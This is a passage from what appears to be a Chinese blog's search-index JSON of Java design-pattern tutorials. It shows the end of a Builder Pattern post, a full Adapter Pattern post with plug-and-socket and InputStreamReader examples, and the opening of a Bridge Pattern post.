class=\"line\">                <span class=\"string\">&quot;, skill=&#x27;&quot;</span> + skill + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, attribute=&#x27;&quot;</span> + attribute + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, gender=&#x27;&quot;</span> + gender + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractActorBuilder</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"type\">Actor</span> <span class=\"variable\">actor</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Actor</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 构建皮肤</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildSkin</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 构建技能</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildSkill</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 构建属性</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildAttribute</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 构建性别</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildGender</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 创建角色</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Actor <span class=\"title function_\">resultActor</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> actor;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 德玛西亚之力建造者</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">GarenActorBuilder</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractActorBuilder</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildSkin</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setSkin(<span class=\"string\">&quot;盖伦皮肤&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildSkill</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setSkill(<span class=\"string\">&quot;盖伦技能&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildAttribute</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setAttribute(<span class=\"string\">&quot;盖伦属性&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildGender</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setGender(<span class=\"string\">&quot;男&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 德邦总管建造者</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">XinZhaoActorBuilder</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractActorBuilder</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildSkin</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setSkin(<span class=\"string\">&quot;赵信皮肤&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildSkill</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setSkill(<span class=\"string\">&quot;赵信技能&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildAttribute</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setAttribute(<span class=\"string\">&quot;赵信属性&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildGender</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setGender(<span class=\"string\">&quot;男&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 寒冰射手</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">AsheActorBuilder</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractActorBuilder</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildSkin</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setSkin(<span class=\"string\">&quot;艾希皮肤&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildSkill</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setSkill(<span class=\"string\">&quot;艾希技能&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildAttribute</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setAttribute(<span class=\"string\">&quot;艾希属性&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildGender</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        actor.setGender(<span class=\"string\">&quot;女&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 建造组装</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">BuilderDirector</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 构建角色</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> actorBuilder</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Actor <span class=\"title function_\">constructActor</span><span class=\"params\">(AbstractActorBuilder actorBuilder)</span>&#123;</span><br><span class=\"line\">        actorBuilder.buildSkin();</span><br><span class=\"line\">        actorBuilder.buildSkill();</span><br><span class=\"line\">        actorBuilder.buildAttribute();</span><br><span class=\"line\">        actorBuilder.buildGender();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> actorBuilder.resultActor();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Actor</span> <span class=\"variable\">asheActor</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BuilderDirector</span>().constructActor(<span class=\"keyword\">new</span> <span class=\"title class_\">AsheActorBuilder</span>());</span><br><span class=\"line\">        <span class=\"comment\">//Actor&#123;skin=&#x27;艾希皮肤&#x27;, skill=&#x27;艾希技能&#x27;, attribute=&#x27;艾希属性&#x27;, gender=&#x27;女&#x27;&#125;</span></span><br><span class=\"line\">        System.out.println(asheActor);</span><br><span class=\"line\">        <span class=\"type\">Actor</span> <span class=\"variable\">xinZhaoActor</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BuilderDirector</span>().constructActor(<span class=\"keyword\">new</span> <span class=\"title class_\">XinZhaoActorBuilder</span>());</span><br><span class=\"line\">        <span class=\"comment\">//Actor&#123;skin=&#x27;赵信皮肤&#x27;, skill=&#x27;赵信技能&#x27;, attribute=&#x27;赵信属性&#x27;, gender=&#x27;男&#x27;&#125;</span></span><br><span class=\"line\">        System.out.println(xinZhaoActor);</span><br><span class=\"line\">        <span class=\"type\">Actor</span> <span class=\"variable\">garenActor</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BuilderDirector</span>().constructActor(<span class=\"keyword\">new</span> <span class=\"title class_\">GarenActorBuilder</span>());</span><br><span class=\"line\">        <span class=\"comment\">//Actor&#123;skin=&#x27;盖伦皮肤&#x27;, skill=&#x27;盖伦技能&#x27;, attribute=&#x27;盖伦属性&#x27;, gender=&#x27;男&#x27;&#125;</span></span><br><span class=\"line\">        System.out.println(garenActor);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在创建角色的时候，用户直接使用建造组装者创建创建相关角色，传入相关角色的创建者即可。在实际使用中，在创建各个组件的时候，应该是有规则的，通过不同的规则建造不同的角色。在后续如果新增了相关角色，可以新建一个角色建造者即可，无需修改其他相关代码。改处缺点在于，如果角色新增了其他相关组件，则修改较大。</p>\n<h3 id=\"建造者总结\"><a href=\"#建造者总结\" class=\"headerlink\" title=\"建造者总结\"></a>建造者总结</h3><p>建造者核心在于一步步构建一个包含多个组件的完整对象，与工厂模式不同在于通常建造者创建的对象相对工厂模式比较复杂，通常工厂模式创建的是单一或者相对不是很复杂的对象。如果将工厂模式看出汽车零件生产厂，建造者模式可以看出汽车装配厂。</p>\n<p><strong>建造者优点：</strong></p>\n<ol>\n<li>用户不需要知道建造细节，将产品本身和产品创建进行解耦，使相同的创建过程可以创建不同的产品。</li>\n<li>扩展方便，符合”开闭原则”</li>\n<li>细化了产品创建，使创建过程清晰明了<br><strong>建造者缺点：</strong></li>\n<li>如果产品过多，会导致建造者过多，系统过于臃肿。</li>\n<li>如果产品组件过于复杂而且多变，会导致产品创建过程过于复杂。</li>\n</ol>\n<p><strong>建造者使用范围：</strong></p>\n<ol>\n<li>需要生成的产品对象有复杂的内部结构，这些产品对象通常包含多个成员属性。</li>\n<li>需要生成的产品对象的属性相互依赖，需要指定其生成顺序。</li>\n<li>对象的创建过程独立于创建该对象的类。在建造者模式中通过引入了指挥者类，将创建过程封装在指挥者类中，而不在建造者类和客户类中。</li>\n<li>隔离复杂对象的创建和使用，并使得相同的创建过程可以创建不同的产品。</li>\n</ol>\n","categories":["设计模式"],"tags":["设计模式","建造者模式","Builder Pattern"]},{"title":"Java设计模式-适配器模式（Adapter Pattern）","url":"/2017/09/15/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F%EF%BC%88Adapter-Pattern%EF%BC%89/","content":"<h3 id=\"不兼容结构的协调–适配器模式\"><a href=\"#不兼容结构的协调–适配器模式\" class=\"headerlink\" title=\"不兼容结构的协调–适配器模式\"></a>不兼容结构的协调–适配器模式</h3><blockquote>\n<p>适配器模式把一个类的接口变换成客户端所期待的另一种接口，从而使原本因接口不匹配而无法在一起工作的两个类能够在一起工作。</p>\n</blockquote>\n<p>当客户类调用适配器的方法时，在适配器类的内部将调用适配者类的方法，而这个过程对客户类是透明的，客户类并不直接访问适配者类。因此，适配器让那些由于接口不兼容而不能交互的类可以一起工作。适配器的特点在于兼容。<br><img src=\"/images/old/20170918%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-18%E4%B8%8B%E5%8D%883.17.05.png\"></p>\n<ul>\n<li>Target是用户使用的目标类</li>\n<li>Adaptee是需要适配的第三方类</li>\n<li>Adapter是适配器类<span id=\"more\"></span></li>\n</ul>\n<p>举例如下：<br><img src=\"/images/old/20170918%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-18%E4%B8%8B%E5%8D%883.11.35.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 插头</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Plug</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 插入充电</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">charge</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 双孔插头</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DoubleEndedPlug</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Plug</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">charge</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;双孔插头充电&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 3孔插座</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreeHoleSocket</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">charge</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;三孔插座充电&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 对象适配器</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DoublePlugAdapter</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">DoubleEndedPlug</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> ThreeHoleSocket socket;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">DoublePlugAdapter</span><span class=\"params\">(ThreeHoleSocket socket)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.socket = socket;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">charge</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//封装数据等操作，使适配器适配</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;双孔适配插入三孔插座&quot;</span>);</span><br><span class=\"line\">        socket.charge();</span><br><span class=\"line\">        <span class=\"comment\">//封装返回值等操作，使适配器适配</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Plug</span> <span class=\"variable\">plug</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DoubleEndedPlug</span>();</span><br><span class=\"line\">        <span class=\"comment\">//默认双孔充电</span></span><br><span class=\"line\">        plug.charge();</span><br><span class=\"line\">        <span class=\"type\">Plug</span> <span class=\"variable\">plugAdapter</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DoublePlugAdapter</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">ThreeHoleSocket</span>());</span><br><span class=\"line\">        <span class=\"comment\">//使用适配器三孔充电</span></span><br><span class=\"line\">        plugAdapter.charge();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用适配器后，可以使用双孔充电器插入双孔插座充电。<br>在JDK中InputStreamReader(InputStream)就是使用的装饰适配器设计模式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//字节流</span></span><br><span class=\"line\"><span class=\"type\">InputStream</span> <span class=\"variable\">fileInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(<span class=\"string\">&quot;tmp.txt&quot;</span>));</span><br><span class=\"line\"><span class=\"type\">StringBuilder</span> <span class=\"variable\">sb</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\"><span class=\"type\">int</span> tmp;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ((tmp = fileInputStream.read()) != -<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">    sb.append((<span class=\"type\">char</span>)tmp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">System.out.println(sb);</span><br><span class=\"line\">fileInputStream.close();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//使用适配器模式，转换为字符流，读取单个字符</span></span><br><span class=\"line\"><span class=\"type\">InputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(<span class=\"string\">&quot;tmp.txt&quot;</span>));</span><br><span class=\"line\"><span class=\"type\">InputStreamReader</span> <span class=\"variable\">inputStreamReader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InputStreamReader</span>(inputStream);</span><br><span class=\"line\">sb = <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\"><span class=\"keyword\">while</span> ((tmp = inputStreamReader.read()) != -<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">    sb.append((<span class=\"type\">char</span>)tmp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">System.out.println(sb);</span><br></pre></td></tr></table></figure>\n<p>InputStreamReader父类Reader是面向字符流的读取接口，使用适配器设计模式后，从字节流中读取数据。</p>\n<h3 id=\"类适配器\"><a href=\"#类适配器\" class=\"headerlink\" title=\"类适配器\"></a>类适配器</h3><p>除了对象适配器模式之外，还有类适配器。类适配器模式和对象适配器模式最大的区别在于适配器和适配者之间的关系不同，对象适配器模式中适配器和适配者之间是关联关系，而类适配器模式中适配器和适配者是继承关系。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 插头</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Plug</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 插入充电</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">charge</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 双孔插头</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DoubleEndedPlug</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Plug</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">charge</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;双孔插头充电&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 3孔插座</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreeHoleSocket</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">charge</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;三孔插座充电&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 类适配器</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DoublePlugAdapter</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ThreeHoleSocket</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Plug</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">charge</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//封装数据等操作，使适配器适配</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;双孔适配插入三孔插座&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.charge();</span><br><span class=\"line\">        <span class=\"comment\">//封装返回值等操作，使适配器适配</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Plug</span> <span class=\"variable\">plug</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DoubleEndedPlug</span>();</span><br><span class=\"line\">        <span class=\"comment\">//默认双孔充电</span></span><br><span class=\"line\">        plug.charge();</span><br><span class=\"line\">        <span class=\"type\">Plug</span> <span class=\"variable\">plugAdapter</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DoublePlugAdapter</span>();</span><br><span class=\"line\">        <span class=\"comment\">//使用适配器三孔充电</span></span><br><span class=\"line\">        plugAdapter.charge();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>因为java不支持多继承，在使用类适配器的时候，会受到很多限制。如果目标类没有接口，无法使用类适配器。</p>\n<h3 id=\"双向适配器\"><a href=\"#双向适配器\" class=\"headerlink\" title=\"双向适配器\"></a>双向适配器</h3><p>双向适配器其实就是在适配器中同时拥有双方的对象，只是对适配器的一种扩充，使用相对较少。</p>\n<h3 id=\"缺省适配器\"><a href=\"#缺省适配器\" class=\"headerlink\" title=\"缺省适配器\"></a>缺省适配器</h3><p>缺省适配器是适配器模式的一种变种。</p>\n<blockquote>\n<p>当不需要实现一个接口所提供的所有方法时，可先设计一个抽象类实现该接口，并为接口中每个方法提供一个默认实现（空方法），那么该抽象类的子类可以选择性地覆盖父类的某些方法来实现需求，它适用于不想使用一个接口中的所有方法的情况，又称为单接口适配器模式。</p>\n</blockquote>\n<p><img src=\"/images/old/20170918%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-18%E4%B8%8B%E5%8D%883.27.08.png\"></p>\n<p>如java.awt.event中WindowAdapter就是使用的缺省适配器设计模式<br><img src=\"/images/old/20170918%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-18%E4%B8%8B%E5%8D%883.29.11.png\"><br><img src=\"/images/old/20170918%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-18%E4%B8%8B%E5%8D%883.29.18.png\"></p>\n<p>在处理窗口事件的时候，可以使用WindowListener接口，但是需要实现接口中所有方法，但是在使用过程中不需要，所以就可以使用WindowAdapter来完成相同的事情。WindowAdapter中实现的方法都为空方法。</p>\n<h3 id=\"适配器设计模式总结\"><a href=\"#适配器设计模式总结\" class=\"headerlink\" title=\"适配器设计模式总结\"></a>适配器设计模式总结</h3><p>优点：</p>\n<ul>\n<li>适配器设计模式是讲现有方法转换为所需要的方法，实现了对类的复用。</li>\n<li>适配器实现了目标类和适配者的解耦</li>\n<li>修改适配器可以在不修改源代码的情况下实现，符合“开闭原则”<br>缺点：</li>\n<li>过多使用适配器会导致系统混乱。</li>\n<li>final无法适配</li>\n<li>不支持多继承，适配有限制<br>适配器一般多用于后期系统扩展、修改。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","适配器模式","Adapter Pattern"]},{"title":"Java设计模式-桥接模式（Bridge Pattern）","url":"/2017/09/20/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%EF%BC%88Bridge-Pattern%EF%BC%89/","content":"<h3 id=\"处理多维度变化–桥接模式\"><a href=\"#处理多维度变化–桥接模式\" class=\"headerlink\" title=\"处理多维度变化–桥接模式\"></a>处理多维度变化–桥接模式</h3><blockquote>\n<p>将抽象部分与它的实现部分分离，使它们都可以独立地变化。它是一种对象结构型模式，又称为柄体(Handle and Body)模式或接口(Interface)模式。</p>\n</blockquote>\n<p>桥接模式用一种巧妙的方式处理多层继承存在的问题，用抽象关联取代了传统的多层继承，将类之间的静态继承关系转换为动态的对象组合关系，使得系统更加灵活，并易于扩展，同时有效控制了系统中类的个数。</p>\n<p>错误示范：<br>要设计武器，要有基本武器，还有附魔武器。<br><img 